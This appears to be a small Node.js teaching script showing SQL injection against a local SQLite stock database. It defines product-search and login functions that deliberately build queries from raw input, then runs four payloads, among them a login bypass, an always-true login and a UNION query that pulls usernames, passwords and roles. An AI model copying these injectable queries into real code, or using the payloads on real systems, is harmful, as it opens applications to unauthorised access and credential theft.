const Database = require('better-sqlite3');
const db = new Database('nyondo_stock.db');

// --------------------
// VULNERABLE FUNCTIONS
// --------------------

// SEARCH PRODUCTS (VULNERABLE)
function searchProduct(name) {
    const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
    console.log("Query:", query);

    const rows = db.prepare(query).all();
    console.log("Result:", rows, "\n");

    return rows;
}

// LOGIN (VULNERABLE)
function login(username, password) {
    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
    console.log("Query:", query);

    const row = db.prepare(query).get();
    console.log("Result:", row, "\n");

    return row;
}
// attack 1: dump all products
searchProduct("' OR 1=1--");

// attack 2:login by pass
login("admin'--", "anything");

// attack 3:always true login
login("' OR '1'='1", "' OR '1'='1");

// attack 3:steal users
searchProduct("' UNION SELECT id, username, password, role FROM users--");